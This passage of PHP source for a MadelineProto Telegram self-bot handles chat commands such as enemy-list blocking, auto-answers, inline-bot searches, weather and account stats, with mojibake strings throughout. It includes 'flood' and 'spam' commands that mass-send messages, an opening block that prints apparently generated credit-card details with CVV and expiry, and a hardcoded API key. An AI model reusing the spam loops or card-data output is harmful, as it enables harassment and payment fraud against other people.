                                    $cvv = $visa2["CVV2"];
                                     $date = $visa2["Expirationdate"];
                                     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
ðµðððð ð½ððð â´ $name
ð»ððð ð½ððð â´  $lname
ð²ðððððð¢ â´ $country
ð°ðððððð â´ $adres
ð²ððð¢ â´ $vcity
ð¿ððððð ð²ððð â´ $post
ð²ðððððððð â´ $state
ð²ððð â´ $cardt
ð²ððð ð½ððððð â´ $cardn
ð²ððð¸ â´ $cvv
ð´ð¡ðððððððð ð³ððð â´ $date
                                     "]);
}

 if(preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text, $m);
$txxt = $m[2];
if(isset($data['answering'][$txxt])){
unset($data['answering'][$txxt]);
file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "!Ú©ÙÙÙ Ø§Ø² ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ Ø­Ø°Ù Ø´Ø¯ ð"]);
} else{
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "! Ø§ÛÙ Ú©ÙÙÙ Ø¯Ø± ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§Û Ø´ÙØ§ ÙÙØ¬ÙØ¯ ÙÛØ³Øªð"]);
}
     }
 if(preg_match("/^[\/\#\!]?(clean answers)$/i", $text)){
$data['answering'] = [];
file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "!ÙÛØ³Øª Ù¾Ø§Ø³Ø® ÙØ§ Ù¾Ø§Ú© Ø´Ø¯"]);
     }
 if(preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text, $m);
$mee = yield $MadelineProto->get_full_info($m[2]);
$me = $mee['User'];
$me_id = $me['id'];
$me_name = $me['first_name'];
if(!in_array($me_id, $data['enemies'])){
$data['enemies'][] = $me_id;
file_put_contents("data.json", json_encode($data));
yield $MadelineProto->contacts->block(['id' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "$me_name ð¾ð?? ððð¥ð  ??âð¼ðð ððð¤ð¥â¨"]);
} else {
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð??ðð£ ðð¤ ð¸ðð£ððððª ðð ð¥ðð ððð¤ð¥ ð ð ððððððð¤ð¤¨"]);
}
     }
 if(preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text, $m);
$mee = yield $MadelineProto->get_full_info($m[2]);
$me = $mee['User'];
$me_id = $me['id'];
$me_name = $me['first_name'];
if(in_array($me_id, $data['enemies'])){
$k = array_search($me_id, $data['enemies']);
unset($data['enemies'][$k]);
file_put_contents("data.json", json_encode($data));
yield $MadelineProto->contacts->unblock(['id' => $m[2]]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "$me_name Dá´Lá´Tá´D FÊOá´ EÉ´Eá´Y LÉªSá´ð©"]);
} else{
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "TÊIê± Uê±EÊ Wá´SÉ´'T IÉ´ EÉ´Eá´Y LÉªSá´ð¨âð¦¯"]);
}
     }
 if(preg_match("/^[\/\#\!]?(clean enemylist)$/i", $text)){
$data['enemies'] = [];
file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ÑÎ·ÑÐ¼ÑâÎ¹ÑÑ Î¹Ñ Î·ÏÏ ÑÐ¼ÏÑÑð§¹"]);
     }
 if(preg_match("/^[\/\#\!]?(enemylist)$/i", $text)){
if(count($data['enemies']) > 0){
$txxxt = "â± á´É´á´á´ÊÊÉªê±á´ â²
";
$counter = 1;
foreach($data['enemies'] as $ene){
  $mee = yield $MadelineProto->get_full_info($ene);
  $me = $mee['User'];
  $me_name = $me['first_name'];
  $txxxt .= "$counter: $me_name \n";
  $counter++;
}
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => $txxxt]);
} else{
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "â§ ð©ð ð¸ðððð â§"]);
}
     }
     if(preg_match("/^[\/\#\!]?(lockpv) (on|off)$/i", $text)){
          preg_match("/^[\/\#\!]?(lockpv) (on|off)$/i", $text, $m);
          $data['lockpv'] = $m[2];
          file_put_contents("data.json", json_encode($data));
          $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "áªOáK á­á¯ ðá°OáªE áOá¯ $m[2]"]);
        }
     if(preg_match("/^[\/\#\!]?(gaming) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(gaming) (on|off)$/i", $text, $m);
     $data['gaming'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Gá©á°IáG ð®á°OáªE áOá¯ $m[2]"]);
     }
     if(preg_match("/^[\/\#\!]?(gamepv) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(gamepv) (on|off)$/i", $text, $m);
     $data['gamepv'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Gá©á°IáGá­á¯ ð½á°OáªE áOá¯ $m[2]"]);
     }
     if(preg_match("/^[\/\#\!]?(photo) (on|off)$/i", $text)){
          preg_match("/^[\/\#\!]?(photo) (on|off)$/i", $text, $m);
          $data['photo'] = $m[2];
          file_put_contents("data.json", json_encode($data));
                $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á­á¼OTO SEááªIáG ð¼á°OáªE áOá¯ $m[2]"]);
               }
               if(preg_match("/^[\/\#\!]?(loc) (on|off)$/i", $text)){
                    preg_match("/^[\/\#\!]?(loc) (on|off)$/i", $text, $m);
                    $data['loc'] = $m[2];
                    file_put_contents("data.json", json_encode($data));
                          $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "áªOáá©TIOá SEááªIáG ð¥á°OáªE áOá¯ $m[2]"]);
                         }
                         if(preg_match("/^[\/\#\!]?(file) (on|off)$/i", $text)){
                              preg_match("/^[\/\#\!]?(file) (on|off)$/i", $text, $m);
                              $data['file'] = $m[2];
                              file_put_contents("data.json", json_encode($data));
                                    $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á´IáªE SEááªIáG ð¦á°OáªE áOá¯ $m[2]"]);
                                   }
     if(preg_match("/^[\/\#\!]?(audio) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(audio) (on|off)$/i", $text, $m);
     $data['audio'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á©ááªIO SEááªIáG ðá°OáªE áOá¯ $m[2]"]);
     }
     if(preg_match("/^[\/\#\!]?(video) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(video) (on|off)$/i", $text, $m);
     $data['video'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á¯IáªEO ð¬SEááªIáG á°OáªE áOá¯ $m[2]"]);
     }

     if(preg_match("/^[\/\#\!]?(proactions) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(proactions) (on|off)$/i", $text, $m);
     $data['proactions'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á­áOá©áTIOáS ð°á°OáªE áOá¯ $m[2]"]);
     }
 if(preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/i", $text, $m);
$count = $m[2];
$txt = $m[3];
$spm = "";
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê°Êá´á´á´ÉªÉ´É¢ â $m[3] â á´Éªá´á´ê± á´¡á´Êá´ â $m[2] â É´á´á´¡ :-)",'parse_mode'=>"MarkDown"]);
for($i=1; $i <= $count; $i++){
$spm .= " $txt \n";
}
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $spm]);
     }
 if(preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/i", $text, $m);
$count = $m[2];
$txt = $m[3];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´á´á´ÉªÉ´É¢ â $m[3] â á´Éªá´á´ê± á´¡á´Êá´ â $m[2] â É´á´á´¡ :-)",'parse_mode'=>"MarkDown"]);
for($i=1; $i <= $count; $i++){
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => " $txt "]);
}
     }
 if(preg_match("/^[\/\#\!]?(music) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(music) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ á´á´ê±Éªá´ á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@melobot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
     if(preg_match("/^[\/\#\!]?(koksal) (.*)$/i", $text)){
     preg_match("/^[\/\#\!]?(koksal) (.*)$/i", $text, $m);
     $mu = $m[2];
     yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ á´á´á´ê±á´ÊÉ¢Éªê° á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
     $messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@G_ifBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
     $query_id = $messages_BotResults['query_id'];
     $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
     yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(wiki) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(wiki) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´á´Êá´ÊÉªÉ´É¢ ê°á´Ê â $m[2] â á´¡á´Êá´ ÉªÉ´ á´¡Éªá´Éªá´á´á´Éªá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@wiki", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(youtube) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(youtube) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´á´Êá´ÊÉªÉ´É¢ ê°á´Ê â $m[2] â á´¡á´Êá´ ÉªÉ´ Êá´á´á´á´Êá´ Êá´á´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@uVidBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(pic) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(pic) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ á´Éªá´á´á´Êá´ á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@pic", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(voice) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(voice) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ á´ á´Éªá´á´ á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@Persian_Meme_Bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(gif) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(gif) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ É¢Éªê° á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@gif", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(google) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(google) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´á´Êá´ÊÉªÉ´É¢ ê°á´Ê â $m[2] â á´¡á´Êá´ ÉªÉ´ É¢á´á´É¢Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@GoogleDEBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(joke)$/i", $text)){
preg_match("/^[\/\#\!]?(joke)$/i", $text, $m);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][0]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(like) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(like) (.*)$/i", $text, $m);
$mu = $m[2];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ ÊÉªá´á´ á´á´É´á´Ê á´¡Éªá´Ê â $m[2] â á´¡á´Êá´ É´á´á´¡ :-) ",'parse_mode'=>"MarkDown"]);
$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@like", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
$query_id = $messages_BotResults['query_id'];
$query_res_id = $messages_BotResults['results'][0]['id'];
yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
     }
 if(preg_match("/^[\/\#\!]?(search) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(search) (.*)$/i", $text, $m);
$q = $m[2];

$res_search = yield $MadelineProto->messages->search(['peer' => $peer, 'q' => $q, 'filter' => ['_' => 'inputMessagesFilterEmpty'], 'min_date' => 0, 'max_date' => time(), 'offset_id' => 0, 'add_offset' => 0, 'limit' => 50, 'max_id' => $message['id'], 'min_id' => 1]);
$texts_count = count($res_search['messages']);
$users_count = count($res_search['users']);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ðð¬ð ð¬ ðð¨ð®ð§ðÂ» $texts_count \nðð«ð¨ð¦ ðð¬ðð«ð¬ ðð¨ð®ð§ð­Â» $users_count"]);
foreach($res_search['messages'] as $text){
$textid = $text['id'];
yield $MadelineProto->messages->forwardMessages(['from_peer' => $text, 'to_peer' => $peer, 'id' => [$textid]]);
 }
}
     if(preg_match("/^[\/\#\!]?(cleans)(.*)$/i", $text)){
preg_match("/^[\/\#\!]?(cleans)(.*)$/i", $text);
     if(!isset($update['update']['message']['reply_to_msg_id'])){
     $del = str_replace("cleans","",$text);
     if(is_numeric($del)){
     for($i = $msg_id -1; $i>=$msg_id -1-$del;$i--){
          $MadelineProto->channels->deleteMessages(['channel' => $peer, 'id' => [$i], ]);
     //$MadelineProto->messages->deleteMessages(['peer' => $peer, 'id' => [$i]]);
     }
     $ed = $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>"$del Ù¾ÛØ§Ù Ø¨Ø§ ÙÙÙÙÛØª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯ÙØ¯ â ", 'parse_mode' => 'HTML' ]);
     }else{
     $ed = $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>"...ÛÚ© Ø¹Ø¯Ø¯ ÙØ§Ø±Ø¯ Ú©ÙÛØ¯ ", 'parse_mode' => 'HTML' ]);
     }
     }
     }

 else if(preg_match("/^[\/\#\!]?(weather) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(weather) (.*)$/i", $text, $m);
$query = $m[2];
$url = json_decode(file_get_contents("http://api.openweathermap.org/data/2.5/weather?q=".$query."&appid=eedbc05ba060c787ab0614cad1f2e12b&units=metric"), true);
$city = $url["name"];
$deg = $url["main"]["temp"];
$type1 = $url["weather"][0]["main"];
if($type1 == "Clear"){
		$tpp = 'Ø¢ÙØªØ§Ø¨Ûâï¸';
		file_put_contents('type.txt',$tpp);
	}
	elseif($type1 == "Clouds"){
		$tpp = 'Ø§Ø¨Ø±Û âï¸âï¸';
		file_put_contents('type.txt',$tpp);
	}
	elseif($type1 == "Rain"){
		 $tpp = 'Ø¨Ø§Ø±Ø§ÙÛ âï¸';
file_put_contents('type.txt',$tpp);
	}
	elseif($type1 == "Thunderstorm"){
		$tpp = 'Ø·ÙÙØ§ÙÛ âï¸âï¸âï¸âï¸';
file_put_contents('type.txt',$tpp);
	}
	elseif($type1 == "Mist"){
		$tpp = 'ÙÙ ð¨';
file_put_contents('type.txt',$tpp);
	}
  if($city != ''){
$ziro = file_get_contents('type.txt');
  $txt = "Ø¯ÙØ§Û Ø´ÙØ± $city ÙÙ Ø§Ú©ÙÙÙ $deg Ø¯Ø±Ø¬Ù Ø³Ø§ÙØªÛ Ú¯Ø±Ø§Ø¯ ÙÛ Ø¨Ø§Ø´Ø¯

Ø´Ø±Ø§ÛØ· ÙØ¹ÙÛ Ø¢Ø¨ Ù ÙÙØ§: $ziro";
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' =>  $txt]);
unlink('type.txt');
}else{
 $txt = "â ï¸ ÙÚ©Ø§Ù Ø´ÙØ± ÙÙØ±Ø¯ ÙØ¸Ø± Ø´ÙØ§ ÙØ§ÙØª ÙØ´Ø¯ â ï¸";
 $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' =>  $txt]);
 }
}
          elseif ( $text == 'Ø§ÙØ§Ø±' || $text == 'Ø¢ÙØ§Ø±' || $text == 'stats' || $text == 'Stats' ) {
 $mem_using = round((memory_get_usage()/1024)/1024, 0).' ÙÚ¯Ø§Ø¨Ø§ÛØª';  
 $load = sys_getloadavg();  
  $peerUser = 0; $supergroup = 0; $channel = 0; $peerChat = 0; $leavegroup = 0;  
  $dialogs = yield $this->get_dialogs();  
foreach ($dialogs as $peer) {   
 if($peer['_'] == 'peerUser') $peerUser ++;  
 elseif($peer['_'] == 'peerChannel') {  
   $Chat = yield $this->getInfo($peer);  
   if($Chat['type'] == 'supergroup') {  
if(isset($Chat['Chat']['banned_rights']) and $Chat['Chat']['banned_rights']['send_messages'] == true){  
try {  
  yield $this->channels->leaveChannel(['channel' => $peer]);  
  $leavegroup ++;  
} catch (\Throwable $e) { }  
}       
$supergroup ++;  
   }  
   elseif($Chat['type'] == 'channel') $channel ++;           
 }  
 elseif($peer['_'] == 'peerChat') $peerChat ++;  
}  
   $contacts = count(yield $this->contacts->getContactIDs());  
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' =>"
<b>
-> ØªØ¹Ø¯Ø§Ø¯ Ù¾ÛÙÛ ÙØ§ : $peerUser
-> ØªØ¹Ø¯Ø§Ø¯ Ú¯Ø±ÙÙ ÙØ§ : $peerChat
-> ØªØ¹Ø¯Ø§Ø¯ Ø³ÙÙ¾Ø±Ú¯Ø±ÙÙ ÙØ§ : $supergroup
-> ØªØ¹Ø¯Ø§Ø¯ Ú©Ø§ÙØ§Ù ÙØ§ : $channel
-> ØªØ¹Ø¯Ø§Ø¯ ÙØ®Ø§Ø·Ø¨Ø§Ù : $contacts
-> ØªØ¹Ø¯Ø§Ø¯ Ú¯Ø±ÙÙ ÙØ§Û Ø®Ø§Ø±Ø¬ Ø´Ø¯Ù : $leavegroup
->  Ù¾ÛÙÚ¯ Ø³Ø±ÙØ± : $load[0]
</b>", 'parse_mode' => 'html' ]);
}
  else if(preg_match("/^[\/\#\!]?(sessions)$/i", $text)){
    yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ â ðððððððð â á´ê° á´á´á´á´á´É´á´ É´á´á´¡ :-)",'parseMarkDown_mode'=>""]);
$authorizations = yield $MadelineProto->account->getAuthorizations();
$txxt="";
foreach($authorizations['authorizations'] as $authorization){
$txxt .="ââââââââ¯âââââââ
ÙØ´: ".$authorization['hash']."
ÙØ¯Ù Ø¯Ø³ØªÚ¯Ø§Ù: ".$authorization['device_model']."
Ø³ÛØ³ØªÙ Ø¹Ø§ÙÙ: ".$authorization['platform']."
ÙØ±ÚÙ Ø³ÛØ³ØªÙ: ".$authorization['system_version']."
api_id: ".$authorization['api_id']."
app_name: ".$authorization['app_name']."
ÙØ³Ø®Ù Ø¨Ø±ÙØ§ÙÙ: ".$authorization['app_version']."
ØªØ§Ø±ÛØ® Ø§ÛØ¬Ø§Ø¯: ".date("Y-m-d H:i:s",$authorization['date_active'])."
ØªØ§Ø±ÛØ® ÙØ¹Ø§Ù: ".date("Y-m-d H:i:s",$authorization['date_active'])."
Ø¢ÛâÙ¾Û: ".$authorization['ip']."
Ú©Ø´ÙØ±: ".$authorization['country']."
ÙÙØ·ÙÙ: ".$authorization['region']."

ââââââââ¯âââââââ";
}
     }
 if(preg_match("/^[\/\#\!]?(gpinfo)$/i", $text)){
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "É¢á´á´á´ÉªÉ´É¢ ÉªÉ´ê°á´ á´ê° â $peer_title â É¢Êá´á´á´ É´á´á´¡ :-)",'parseMarkDown_mode'=>""]);
$peer_inf = yield $MadelineProto->get_full_info($message['to_id']);
$peer_info = $peer_inf['Chat'];
$peer_id = $peer_info['id'];
$peer_title = $peer_info['title'];
$peer_type = $peer_inf['type'];
$peer_count = $peer_inf['full']['participants_count'];
$des = $peer_inf['full']['about'];
$mes = "ððÂ» $peer_id \nðð¢ð­ð¥ðÂ» $peer_title \nðð²ð©ðÂ» $peer_type \nððð¦ððð«ð¬ ðð¨ð®ð§ð­Â» $peer_count \nðð¢ð¨Â» $des";
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $mes]);
     }
   
   
   
   
     }elseif($text == "Ø±Ø¨Ø§Øª"){
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
      â ððð£ ððð¦ ðð¢ ððð
"]);
}
   
   
   }elseif($text == "Ø±Ø¨Ø§Øª"){
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ð¢ Ø±Ø¨Ø§Øª Ø´ÙØ§ Ø¨Ù Ø¯Ø³ØªÙØ± ÙÙÛØ³ÙØ¯Ù Û Ø±Ø¨Ø§Øª Ø§Ø² Ú©Ø§Ø± Ø§ÙØªØ§Ø¯ð¢ 
@source_kabos
", 'parse_mode' => 'html' ]); 
}
   
  }
   
   
   
   
   
   
   
   
   
   
 if($data['power'] == "on"){
   if ($from_id !=$para) {
   if($message && $data['typing'] == "on" && $update['_'] == "updateNewChannelMessage"){
$sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
     }
     if( $data['gaming'] == "on" && $update['_'] == "updateNewChannelMessage"){
     $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
     yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
     }
     if( $data['gamepv'] == "on"){
      $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
      yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
      }
     if($data['photo'] == "on" && $update['_'] == "updateNewChannelMessage"){
          $sendMessageUploadPhotoAction = ['_' => 'sendMessageUploadPhotoAction', 'progress' => 85];
          yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageUploadPhotoAction]);
          }
          if( $data['file'] == "on" && $update['_'] == "updateNewChannelMessage"){
               $sendMessageUploadDocumentAction = ['_' => 'sendMessageUploadDocumentAction', 'progress' => 85];
               yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageUploadDocumentAction]);
               }
               if( $data['loc'] == "on" && $update['_'] == "updateNewChannelMessage"){
                    $sendMessageGeoLocationAction = ['_' => 'sendMessageGeoLocationAction'];
                    yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGeoLocationAction]);
                    }
     if($data['video'] == "on" && $update['_'] == "updateNewChannelMessage"){
     $sendMessageRecordRoundAction = ['_' => 'sendMessageRecordRoundAction'];
     yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordRoundAction]);
     }
     if($data['audio'] == "on" && $update['_'] == "updateNewChannelMessage"){
     $sendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
     yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordAudioAction]);
     }
     if($message && $data['echo'] == "on"){
yield $MadelineProto->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $peer, 'id' => [$message['id']]]);
     }
     if($message && $data['markread'] == "on"){
if(intval($peer) < 0){
yield $MadelineProto->channels->readHistory(['channel' => $peer, 'max_id' => $message['id']]);
yield $MadelineProto->channels->readMessageContents(['channel' => $peer, 'id' => [$message['id']] ]);
} else{
yield $MadelineProto->messages->readHistory(['peer' => $peer, 'max_id' => $message['id']]);
}
     }
